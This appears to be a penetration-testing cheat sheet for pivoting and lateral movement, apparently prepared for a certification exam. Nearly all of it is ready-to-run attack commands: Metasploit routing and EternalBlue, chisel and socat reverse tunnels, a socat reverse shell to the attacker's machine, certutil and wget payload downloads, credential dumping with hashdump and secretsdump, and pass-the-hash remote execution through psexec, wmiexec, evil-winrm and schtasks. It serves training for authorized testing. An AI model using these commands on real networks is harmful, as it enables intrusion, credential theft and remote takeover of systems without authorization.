## 🗺️ PIVOTING FLOW

```
Foothold → Discover Internal Network → Set Up Tunnel/Route → Scan Internal → Exploit Internal Target
```

---

## 1️⃣ NETWORK DISCOVERY — From Foothold ⭐

```bash
# Linux foothold
ip a
ip route
cat /etc/hosts
cat /etc/networks
arp -a
netstat -tulnp
ss -tulnp
for i in $(seq 1 254); do ping -c1 -W1 10.10.10.$i & done | grep "64 bytes"

# Windows foothold (cmd/meterpreter shell)
ipconfig /all
route print
arp -a
netstat -ano
net view
```

### Meterpreter Network Discovery

```bash
# Inside meterpreter session
ipconfig
arp
route
run post/multi/gather/ping_sweep RHOSTS=10.10.10.0/24
run post/windows/gather/arp_scanner RHOSTS=10.10.10.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=10.10.10.0/24 PORTS=22,80,445,3389,8080
```

---

## 2️⃣ METASPLOIT ROUTING + SOCKS PROXY — Heavy Hitter ⭐⭐⭐

### autoroute — Heavy Hitter ⭐⭐⭐

```bash
# Method 1 — From meterpreter session
run autoroute -s 10.10.10.0/24          # add route through session
run autoroute -p                         # print current routes
run autoroute -d -s 10.10.10.0/24       # delete route

# Method 2 — From msfconsole background
background
use post/multi/manage/autoroute
set SESSION [SESSION_ID]
set SUBNET 10.10.10.0
set NETMASK 255.255.255.0
run

# Method 3 — route command in msfconsole
route add 10.10.10.0/24 [SESSION_ID]
route print
route flush
```

### SOCKS Proxy (route traffic through session)

```bash
# After autoroute — add SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
set VERSION 5
run -j                                   # run as background job

# Verify proxy is running
jobs
netstat -tulnp | grep 9050
```

### proxychains — Use with SOCKS (On Kali)

```bash
# /etc/proxychains4.conf (or proxychains.conf):
# socks5 127.0.0.1 9050

# Use proxychains to reach internal hosts
proxychains nmap -sT -Pn -p 22,80,445,3389 10.10.10.[TARGET]
proxychains nmap -sT -Pn --top-ports 20 10.10.10.0/24
proxychains curl http://10.10.10.[TARGET]
proxychains crackmapexec smb 10.10.10.[TARGET]
proxychains evil-winrm -i 10.10.10.[TARGET] -u [USER] -p [PASS]
proxychains psexec.py [USER]:[PASS]@10.10.10.[TARGET]
proxychains python3 exploit.py 10.10.10.[TARGET]
proxychains ssh [USER]@10.10.10.[TARGET]
proxychains xfreerdp /u:[USER] /p:[PASS] /v:10.10.10.[TARGET]

# Edit proxychains config
cat /etc/proxychains4.conf | grep -v "^#"
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
```

### Full MSF Pivot Workflow — Step by Step

```bash
# Step 1 — get meterpreter session on pivot host
# Step 2 — background session: Ctrl+Z or background

# Step 3 — add route
use post/multi/manage/autoroute
set SESSION [SESSION_ID]
set SUBNET 10.10.10.0
run

# Step 4 — start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run -j

# Step 5 — scan internal with proxychains
proxychains nmap -sT -Pn -p- 10.10.10.[INTERNAL_TARGET] -oN internal_scan.txt

# Step 6 — exploit internal target through proxy
proxychains msfconsole         # or run MSF modules directly (route handles it)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.[INTERNAL_TARGET]
set LHOST [KALI_IP]            # or pivot IP for bind payloads
run
```

---

## 3️⃣ CHISEL — Heavy Hitter ⭐⭐⭐

```bash
# Download chisel: https://github.com/jpillora/chisel/releases
# Upload chisel binary to target

# ── SCENARIO 1: SOCKS5 Proxy (most common) ──

# Kali (server):
./chisel server -p 8888 --reverse

# Target (client — Linux):
./chisel client [KALI_IP]:8888 R:9050:socks

# Target (client — Windows):
.\chisel.exe client [KALI_IP]:8888 R:9050:socks

# Then use proxychains with socks5 127.0.0.1 9050


# ── SCENARIO 2: Port Forward (single port) ──

# Kali (server):
./chisel server -p 8888 --reverse

# Target — forward internal RDP to Kali port 3389:
./chisel client [KALI_IP]:8888 R:3389:10.10.10.[INTERNAL]:3389

# Now on Kali connect to 127.0.0.1:3389 → hits internal RDP
xfreerdp /u:[USER] /p:[PASS] /v:127.0.0.1


# ── SCENARIO 3: Multiple Port Forwards ──

# Target:
./chisel client [KALI_IP]:8888 R:3389:10.10.10.10:3389 R:445:10.10.10.10:445 R:8080:10.10.10.10:80


# ── SCENARIO 4: Client as Server (no reverse needed) ──

# Target (server):
./chisel server -p 9999

# Kali (client):
./chisel client [TARGET_IP]:9999 9050:socks
```

### Chisel Upload Methods

```bash
# Linux target:
wget http://[KALI_IP]/chisel -O /tmp/chisel
chmod +x /tmp/chisel

# Windows target:
certutil -urlcache -split -f http://[KALI_IP]/chisel.exe C:\Temp\chisel.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://[KALI_IP]/chisel.exe','C:\Temp\chisel.exe')"
```

---

## 4️⃣ SSH TUNNELING ⭐⭐

### Local Port Forward (-L) — Reach internal service on Kali

```bash
# Syntax: ssh -L [LOCAL_PORT]:[INTERNAL_TARGET]:[INTERNAL_PORT] [USER]@[PIVOT_HOST]

# Access internal web server on Kali port 8080
ssh -L 8080:10.10.10.[INTERNAL]:80 [USER]@[PIVOT_IP]

# Access internal RDP on Kali port 3389
ssh -L 3389:10.10.10.[INTERNAL]:3389 [USER]@[PIVOT_IP]

# Access internal SMB
ssh -L 445:10.10.10.[INTERNAL]:445 [USER]@[PIVOT_IP]

# Then connect via localhost:
curl http://127.0.0.1:8080
xfreerdp /u:[USER] /p:[PASS] /v:127.0.0.1:3389
smbclient //127.0.0.1/share -U [USER]
```

### Dynamic Port Forward (-D) — Full SOCKS proxy

```bash
# Kali gets SOCKS5 proxy on port 9050
ssh -D 9050 -f -N [USER]@[PIVOT_IP]
ssh -D 9050 -N [USER]@[PIVOT_IP]          # foreground

# -f = background, -N = no command (tunnel only)

# Then use proxychains → socks5 127.0.0.1 9050
proxychains nmap -sT -Pn 10.10.10.0/24
```

### Remote Port Forward (-R) — Expose Kali port through target

```bash
# Syntax: ssh -R [REMOTE_PORT]:[LOCAL_HOST]:[LOCAL_PORT] [USER]@[REMOTE_HOST]

# Expose Kali's 4444 listener on pivot host port 4444
# (useful when internal target can't reach Kali directly)
ssh -R 4444:127.0.0.1:4444 [USER]@[PIVOT_IP]

# Reverse shell payload on internal target points to pivot_ip:4444
# → tunnels back to Kali:4444
```

### SSH with Key (No Password)

```bash
ssh -i /path/to/id_rsa [USER]@[PIVOT_IP]
ssh -i /path/to/id_rsa -L 8080:10.10.10.[INTERNAL]:80 [USER]@[PIVOT_IP]
ssh -i /path/to/id_rsa -D 9050 -N [USER]@[PIVOT_IP]

# Suppress host key check
ssh -o StrictHostKeyChecking=no [USER]@[PIVOT_IP]
```

---

## 5️⃣ SOCAT — Port Relay/Forward ⭐

```bash
# ── Port Relay (no SSH needed) ──

# On pivot host — forward all traffic on 8080 to internal host:
socat TCP-LISTEN:8080,fork TCP:10.10.10.[INTERNAL]:80

# Forward Kali traffic to internal:
socat TCP-LISTEN:3389,fork TCP:10.10.10.[INTERNAL]:3389 &

# ── Reverse Shell Relay ──

# Kali listener:
nc -lvnp 4444

# Pivot — relay connection from internal target to Kali:
socat TCP-LISTEN:5555,fork TCP:[KALI_IP]:4444 &

# Internal target payload points to pivot:5555 → socat → Kali:4444

# ── Full TTY via socat ──
# Kali:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[KALI_IP]:4444
```

---

## 6️⃣ PASS-THE-HASH (PTH) ⭐⭐

### Capture Hash First

```bash
# From meterpreter / kiwi
hashdump
lsa_dump_sam
creds_msv

# From secretsdump
secretsdump.py [USER]:[PASS]@[TARGET_IP]
# Output format: USER:RID:LM_HASH:NTLM_HASH:::
# Use NTLM_HASH (after last colon)
```

### crackmapexec PTH ⭐

```bash
# SMB — PTH
crackmapexec smb [TARGET_IP] -u [USER] -H [NTLM_HASH]
crackmapexec smb [TARGET_IP]/24 -u [USER] -H [NTLM_HASH]      # sweep subnet
crackmapexec smb [TARGET_IP] -u [USER] -H [NTLM_HASH] -x "whoami"
crackmapexec smb [TARGET_IP] -u [USER] -H [NTLM_HASH] --shares

# WinRM — PTH
crackmapexec winrm [TARGET_IP] -u [USER] -H [NTLM_HASH]

# SSH
crackmapexec ssh [TARGET_IP] -u [USER] -p [PASS]
```

### psexec.py PTH ⭐

```bash
# With password
psexec.py [USER]:[PASS]@[TARGET_IP]

# PTH — SYSTEM shell
psexec.py -hashes :[NTLM_HASH] [USER]@[TARGET_IP]
psexec.py -hashes [LM]:[NTLM] [USER]@[TARGET_IP]

# Through proxychains (pivot)
proxychains psexec.py -hashes :[NTLM_HASH] [USER]@10.10.10.[INTERNAL]
```

### wmiexec.py ⭐

```bash
# With password
wmiexec.py [USER]:[PASS]@[TARGET_IP]
wmiexec.py [USER]:[PASS]@[TARGET_IP] "cmd.exe /c whoami"

# PTH
wmiexec.py -hashes :[NTLM_HASH] [USER]@[TARGET_IP]
wmiexec.py -hashes :[NTLM_HASH] [USER]@[TARGET_IP] "whoami"

# Through proxychains
proxychains wmiexec.py [USER]:[PASS]@10.10.10.[INTERNAL]
```

### smbexec.py

```bash
smbexec.py [USER]:[PASS]@[TARGET_IP]
smbexec.py -hashes :[NTLM_HASH] [USER]@[TARGET_IP]
```

### MSF PSExec PTH

```bash
use exploit/windows/smb/psexec
set RHOSTS [TARGET_IP]
set SMBUser [USER]
set SMBPass [NTLM_HASH]                    # paste full hash LM:NTLM
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [KALI_IP]
run
```

---

## 7️⃣ EVIL-WINRM ⭐⭐

```bash
# Port 5985 (HTTP) / 5986 (HTTPS) must be open

# With password
evil-winrm -i [TARGET_IP] -u [USER] -p [PASS]

# PTH
evil-winrm -i [TARGET_IP] -u [USER] -H [NTLM_HASH]

# With SSL
evil-winrm -i [TARGET_IP] -u [USER] -p [PASS] -S

# File upload/download inside evil-winrm
upload /path/on/kali/file.exe
download C:\path\on\target\file.txt

# Load PowerShell scripts
evil-winrm -i [TARGET_IP] -u [USER] -p [PASS] -s /opt/PowerSploit/

# Through proxychains (pivot)
proxychains evil-winrm -i 10.10.10.[INTERNAL] -u [USER] -p [PASS]
```

---

## 8️⃣ WMI LATERAL MOVEMENT

```bash
# From Windows foothold (cmd)
wmic /node:[TARGET_IP] /user:[USER] /password:[PASS] process call create "cmd.exe /c whoami > C:\output.txt"
wmic /node:[TARGET_IP] /user:[USER] /password:[PASS] process call create "C:\Temp\shell.exe"

# Check result
wmic /node:[TARGET_IP] /user:[USER] /password:[PASS] process list brief

# PowerShell WMI
powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c C:\Temp\shell.exe' -ComputerName [TARGET_IP] -Credential (Get-Credential)"
```

---

## 9️⃣ SCHEDULED TASKS — Lateral Movement

```bash
# From Windows cmd (with creds)
schtasks /create /s [TARGET_IP] /u [USER] /p [PASS] /tn "Update" /tr "C:\Temp\shell.exe" /sc once /st 00:00
schtasks /run /s [TARGET_IP] /u [USER] /p [PASS] /tn "Update"
schtasks /delete /s [TARGET_IP] /u [USER] /p [PASS] /tn "Update" /f

# impacket — atexec
atexec.py [USER]:[PASS]@[TARGET_IP] "whoami"
atexec.py -hashes :[NTLM_HASH] [USER]@[TARGET_IP] "C:\Temp\shell.exe"
```

---

## 🔟 METERPRETER PORT FORWARD & ROUTING ⭐⭐

```bash
# ── portfwd (single port access) ──
portfwd add -l [LOCAL_PORT] -p [REMOTE_PORT] -r [TARGET_IP]
portfwd list
portfwd delete -l [LOCAL_PORT]
portfwd flush

# Common examples
portfwd add -l 8080 -p 80   -r 10.10.10.[INTERNAL]
portfwd add -l 3389 -p 3389 -r 10.10.10.[INTERNAL]
portfwd add -l 445  -p 445  -r 10.10.10.[INTERNAL]

# After portfwd — connect via localhost on Kali
nmap -sT -Pn -p 8080 127.0.0.1
curl http://127.0.0.1:8080
xfreerdp /u:[USER] /p:[PASS] /v:127.0.0.1:3389
smbclient //127.0.0.1/share -U [USER]

# ── autoroute (subnet-wide routing through session) ──
run autoroute -s [SUBNET]/24           # add route
run autoroute -p                       # print routes
run autoroute -d -s [SUBNET]/24        # delete route

# OR from msfconsole (session backgrounded)
route add [SUBNET]/24 [SESSION_ID]
route print
route flush
```

---

## ⚡ QUICK REFERENCE — Scenario → Tool Chain

|Scenario|Tool Chain|
|---|---|
|MSF session → reach internal subnet|`autoroute` → `socks_proxy` → `proxychains`|
|No MSF — Linux pivot|`chisel` server (Kali) + client (target) → SOCKS|
|No MSF — Windows pivot|`chisel.exe` client → reverse SOCKS → `proxychains`|
|SSH access to pivot|`ssh -D 9050 -N` → `proxychains`|
|Single internal port only|`ssh -L` or `portfwd` or `socat` relay|
|Have NTLM hash → Windows|`crackmapexec` PTH → `psexec.py` PTH|
|Port 5985 open → Windows|`evil-winrm` with pass or hash|
|Need internal nmap scan|`proxychains nmap -sT -Pn` (TCP only through proxy)|
|Relay rev shell through pivot|`socat` listener on pivot → forward to Kali|

---

## 🧠 EXAM DECISION TREE

```
Got shell on pivot host?
│
├── MSF meterpreter?
│   ├── run autoroute -s [INTERNAL_SUBNET]/24
│   ├── use auxiliary/server/socks_proxy → port 9050 → run -j
│   └── proxychains [any tool] [INTERNAL_TARGET]
│
├── SSH access to pivot?
│   ├── ssh -D 9050 -N [USER]@[PIVOT_IP]    → proxychains
│   └── ssh -L [PORT]:[INTERNAL_IP]:[PORT] [USER]@[PIVOT_IP]  → single service
│
├── No SSH — need tunnel?
│   ├── Upload chisel → server on Kali → client on target → SOCKS 9050
│   └── Upload socat → relay specific port
│
├── Got NTLM hash?
│   ├── crackmapexec smb [INTERNAL]/24 -u [USER] -H [HASH]  → find Pwn3d!
│   ├── psexec.py -hashes :[HASH] [USER]@[INTERNAL]          → SYSTEM shell
│   └── evil-winrm -i [INTERNAL] -u [USER] -H [HASH]         → PS shell
│
└── Port 5985 on internal target?
    └── evil-winrm → upload winPEAS → PrivEsc
```

---

## 📋 PROXYCHAINS CONFIG — Quick Setup

```bash
# Edit config
nano /etc/proxychains4.conf
# OR
nano /etc/proxychains.conf

# Required lines at bottom:
[ProxyList]
socks5 127.0.0.1 9050

# Optional — quiet mode (less output)
# uncomment: quiet_mode

# Verify
proxychains curl http://10.10.10.[INTERNAL]
```

---
---
